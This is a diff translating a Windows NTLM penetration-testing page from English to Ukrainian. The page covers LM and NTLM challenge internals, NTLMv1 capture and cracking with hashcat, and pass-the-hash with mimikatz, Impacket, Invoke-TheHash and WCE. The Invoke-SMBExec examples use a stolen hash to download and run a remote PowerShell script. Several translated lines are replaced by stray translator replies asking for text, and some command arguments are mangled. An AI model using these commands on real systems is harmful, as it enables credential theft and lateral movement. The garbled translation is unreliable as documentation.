@@ -2,43 +2,40 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Information
+## Основна інформація
 
-In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
+У середовищах, де працюють **Windows XP та Server 2003**, використовуються LM (Lan Manager) хеші, хоча загальновідомо, що їх легко скомпрометувати. Конкретний LM хеш, `AAD3B435B51404EEAAD3B435B51404EE`, вказує на ситуацію, коли LM не використовується, представляючи хеш для порожнього рядка.
 
-By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.
+За замовчуванням, **Kerberos** є основним методом аутентифікації. NTLM (NT LAN Manager) вступає в силу за певних обставин: відсутність Active Directory, неіснування домену, несправність Kerberos через неправильну конфігурацію або коли спроби підключення здійснюються за допомогою IP-адреси замість дійсного імені хоста.
 
-The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.
+Наявність заголовка **"NTLMSSP"** в мережевих пакетах сигналізує про процес аутентифікації NTLM.
 
-Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.
+Підтримка протоколів аутентифікації - LM, NTLMv1 та NTLMv2 - забезпечується специфічною DLL, розташованою за адресою `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
+**Ключові моменти**:
 
-- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
-- Kerberos is the default authentication method, with NTLM used only under certain conditions.
-- NTLM authentication packets are identifiable by the "NTLMSSP" header.
-- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
+- LM хеші вразливі, а порожній LM хеш (`AAD3B435B51404EEAAD3B435B51404EE`) свідчить про його не використання.
+- Kerberos є методом аутентифікації за замовчуванням, а NTLM використовується лише за певних умов.
+- Пакети аутентифікації NTLM можна ідентифікувати за заголовком "NTLMSSP".
+- Протоколи LM, NTLMv1 та NTLMv2 підтримуються системним файлом `msv1\_0.dll`.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 та NTLMv2
 
-You can check and configure which protocol will be used:
+Ви можете перевірити та налаштувати, який протокол буде використовуватися:
 
 ### GUI
 
-Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
+Виконайте _secpol.msc_ -> Локальні політики -> Параметри безпеки -> Мережевий захист: рівень аутентифікації LAN Manager. Є 6 рівнів (від 0 до 5).
 
 ![](<../../images/image (919).png>)
 
-### Registry
+### Реєстр
 
-This will set the level 5:
-
+Це встановить рівень 5:
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-
-Possible values:
-
+Можливі значення:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -47,58 +44,54 @@ Possible values:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+## Основна схема аутентифікації NTLM домену
 
-## Basic NTLM Domain authentication Scheme
+1. **Користувач** вводить свої **облікові дані**
+2. Клієнтська машина **надсилає запит на аутентифікацію**, відправляючи **ім'я домену** та **ім'я користувача**
+3. **Сервер** надсилає **виклик**
+4. **Клієнт шифрує** **виклик** за допомогою хешу пароля як ключа і надсилає його у відповідь
+5. **Сервер надсилає** до **контролера домену** **ім'я домену, ім'я користувача, виклик та відповідь**. Якщо **немає** налаштованого Active Directory або ім'я домену є ім'ям сервера, облікові дані **перевіряються локально**.
+6. **Контролер домену перевіряє, чи все вірно** і надсилає інформацію на сервер
 
-1. The **user** introduces his **credentials**
-2. The client machine **sends an authentication request** sending the **domain name** and the **username**
-3. The **server** sends the **challenge**
-4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
-5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
-6. The **domain controller checks if everything is correct** and sends the information to the server
+**Сервер** та **контролер домену** можуть створити **захищений канал** через **Netlogon** сервер, оскільки контролер домену знає пароль сервера (він знаходиться в базі даних **NTDS.DIT**).
 
-The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).
+### Локальна схема аутентифікації NTLM
 
-### Local NTLM authentication Scheme
+Аутентифікація така ж, як і згадувалася **раніше, але** **сервер** знає **хеш користувача**, який намагається аутентифікуватися в файлі **SAM**. Тому, замість того, щоб запитувати контролер домену, **сервер перевірить самостійно**, чи може користувач аутентифікуватися.
 
-The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.
+### Виклик NTLMv1
 
-### NTLMv1 Challenge
+**Довжина виклику становить 8 байт**, а **відповідь має довжину 24 байти**.
 
-The **challenge length is 8 bytes** and the **response is 24 bytes** long.
+**Хеш NT (16 байт)** ділиться на **3 частини по 7 байт кожна** (7B + 7B + (2B+0x00\*5)): **остання частина заповнена нулями**. Потім **виклик** **шифрується окремо** з кожною частиною, а **отримані** зашифровані байти **об'єднуються**. Всього: 8B + 8B + 8B = 24 байти.
 
-The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.
+**Проблеми**:
 
-**Problems**:
+- Відсутність **випадковості**
+- 3 частини можуть бути **атаковані окремо** для знаходження NT хешу
+- **DES можна зламати**
+- 3-й ключ завжди складається з **5 нулів**.
+- За **однаковим викликом** **відповідь** буде **однаковою**. Тому ви можете дати як **виклик** жертві рядок "**1122334455667788**" і атакувати відповідь, використовуючи **попередньо обчислені райдужні таблиці**.
 
-- Lack of **randomness**
-- The 3 parts can be **attacked separately** to find the NT hash
-- **DES is crackable**
-- The 3º key is composed always by **5 zeros**.
-- Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
+### Атака NTLMv1
 
-### NTLMv1 attack
+В наш час стає все менш поширеним знаходити середовища з налаштованою неконтрольованою делегацією, але це не означає, що ви не можете **зловживати службою Print Spooler**, яка налаштована.
 
-Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.
+Ви могли б зловживати деякими обліковими даними/сесіями, які у вас вже є в AD, щоб **попросити принтер аутентифікуватися** проти деякого **хоста під вашим контролем**. Потім, використовуючи `metasploit auxiliary/server/capture/smb` або `responder`, ви можете **встановити виклик аутентифікації на 1122334455667788**, захопити спробу аутентифікації, і якщо вона була виконана за допомогою **NTLMv1**, ви зможете **зламати її**.\
+Якщо ви використовуєте `responder`, ви можете спробувати \*\*використати прапорець `--lm` \*\* для спроби **знизити** **аутентифікацію**.\
+&#xNAN;_&#x4E;ote що для цієї техніки аутентифікація повинна виконуватися за допомогою NTLMv1 (NTLMv2 не дійсний)._
 
-You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
-If you are using `responder` you could try to \*\*use the flag `--lm` \*\* to try to **downgrade** the **authentication**.\
-&#xNAN;_&#x4E;ote that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
+Пам'ятайте, що принтер буде використовувати обліковий запис комп'ютера під час аутентифікації, а облікові записи комп'ютерів використовують **довгі та випадкові паролі**, які ви **ймовірно не зможете зламати**, використовуючи звичайні **словники**. Але **аутентифікація NTLMv1** **використовує DES** ([більше інформації тут](./#ntlmv1-challenge)), тому, використовуючи деякі служби, спеціально призначені для зламу DES, ви зможете її зламати (ви можете використовувати [https://crack.sh/](https://crack.sh) або [https://ntlmv1.com/](https://ntlmv1.com) наприклад).
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).
+### Атака NTLMv1 з hashcat
 
-### NTLMv1 attack with hashcat
+NTLMv1 також можна зламати за допомогою NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), який форматує повідомлення NTLMv1 у метод, який можна зламати за допомогою hashcat.
 
-NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
-
-The command
-
+Команда
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-
-would output the below:
-
+Please provide the text you would like me to translate.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -124,22 +117,16 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-
-Create a file with the contents of:
-
+Створіть файл з вмістом:
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-
-Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
-
+Запустіть hashcat (найкраще в розподіленому режимі через інструмент, такий як hashtopolis), оскільки це займе кілька днів в іншому випадку.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-
-In this case we know the password to this is password so we are going to cheat for demo purposes:
-
+У цьому випадку ми знаємо, що пароль - це password, тому ми будемо обманювати для демонстраційних цілей:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -148,9 +135,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-
-We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
-
+Тепер нам потрібно використовувати hashcat-utilities, щоб перетворити зламані des ключі на частини NTLM хешу:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -158,131 +143,111 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-
-Ginally the last part:
-
+На жаль, ви не надали текст для перекладу. Будь ласка, надайте текст, який потрібно перекласти.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-
-Combine them together:
-
+Please provide the text you would like me to translate.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
-
 ### NTLMv2 Challenge
 
-The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
+Довжина **виклику становить 8 байт** і **надсилаються 2 відповіді**: одна з них **довжиною 24 байти**, а довжина **іншої** є **змінною**.
 
-**The first response** is created by ciphering using **HMAC_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+**Перша відповідь** створюється шляхом шифрування за допомогою **HMAC_MD5** рядка, що складається з **клієнта та домену**, використовуючи в якості **ключа** **хеш MD4** **NT hash**. Потім **результат** буде використаний як **ключ** для шифрування за допомогою **HMAC_MD5** **виклику**. До цього буде **додано клієнтський виклик довжиною 8 байт**. Усього: 24 Б.
 
-The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
+**Друга відповідь** створюється за допомогою **кількох значень** (новий клієнтський виклик, **мітка часу** для уникнення **атаки повтору**...)
 
-If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
+Якщо у вас є **pcap, який зафіксував успішний процес аутентифікації**, ви можете слідувати цьому посібнику, щоб отримати домен, ім'я користувача, виклик і відповідь та спробувати зламати пароль: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
-**Once you have the hash of the victim**, you can use it to **impersonate** it.\
-You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.
+**Якщо у вас є хеш жертви**, ви можете використовувати його для **імітування**.\
+Вам потрібно використовувати **інструмент**, який **виконає** **аутентифікацію NTLM, використовуючи** цей **хеш**, **або** ви можете створити новий **sessionlogon** і **впровадити** цей **хеш** в **LSASS**, так що коли будь-яка **аутентифікація NTLM виконується**, цей **хеш буде використаний.** Останній варіант - це те, що робить mimikatz.
 
-**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**
+**Будь ласка, пам'ятайте, що ви також можете виконувати атаки Pass-the-Hash, використовуючи облікові записи комп'ютерів.**
 
 ### **Mimikatz**
 
-**Needs to be run as administrator**
-
+**Потрібно запускати від імені адміністратора**
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
+Це запустить процес, який буде належати користувачам, які запустили mimikatz, але внутрішньо в LSASS збережені облікові дані - це ті, що всередині параметрів mimikatz. Потім ви можете отримати доступ до мережевих ресурсів так, ніби ви є тим користувачем (схоже на трюк `runas /netonly`, але вам не потрібно знати пароль у відкритому вигляді).
 
-This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).
+### Pass-the-Hash з linux
 
-### Pass-the-Hash from linux
+Ви можете отримати виконання коду на Windows машинах, використовуючи Pass-the-Hash з Linux.\
+[**Доступ сюди, щоб дізнатися, як це зробити.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
 
-You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
-[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
+### Impacket Windows скомпільовані інструменти
 
-### Impacket Windows compiled tools
-
-You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+Ви можете завантажити [impacket бінарники для Windows тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- There are several more Impacket binaries...
+- **atexec.exe** (У цьому випадку вам потрібно вказати команду, cmd.exe та powershell.exe не є дійсними для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+- Є ще кілька бінарників Impacket...
 
 ### Invoke-TheHash
 
-You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+Ви можете отримати скрипти powershell звідси: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
-
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-WMIExec
-
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-SMBClient
-
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
-
 #### Invoke-SMBEnum
-
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
-
 #### Invoke-TheHash
 
-This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
-
+Ця функція є **поєднанням усіх інших**. Ви можете передати **кілька хостів**, **виключити** деяких і **вибрати** **опцію**, яку хочете використовувати (_SMBExec, WMIExec, SMBClient, SMBEnum_). Якщо ви виберете **будь-який** з **SMBExec** і **WMIExec**, але не надасте жодного _**Command**_ параметра, вона просто **перевірить**, чи у вас є **достатні дозволи**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
-
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
 ### Windows Credentials Editor (WCE)
 
-**Needs to be run as administrator**
+**Потрібно запускати від імені адміністратора**
 
-This tool will do the same thing as mimikatz (modify LSASS memory).
-
+Цей інструмент виконає те ж саме, що і mimikatz (модифікує пам'ять LSASS).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-
-### Manual Windows remote execution with username and password
+### Ручне віддалене виконання Windows з ім'ям користувача та паролем
 
 {{#ref}}
 ../lateral-movement/
 {{#endref}}
 
-## Extracting credentials from a Windows Host
+## Витягування облікових даних з Windows Host
 
-**For more information about** [**how to obtain credentials from a Windows host you should read this page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
+**Для отримання додаткової інформації про** [**те, як отримати облікові дані з Windows host, вам слід прочитати цю сторінку**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
-## NTLM Relay and Responder
+## NTLM Relay та Responder
 
-**Read more detailed guide on how to perform those attacks here:**
+**Читати більш детальну інструкцію про те, як виконати ці атаки тут:**
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-## Parse NTLM challenges from a network capture
+## Парсинг NTLM викликів з мережевого захоплення
 
-**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+**Ви можете використовувати** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 {{#include ../../banners/hacktricks-training.md}}
-
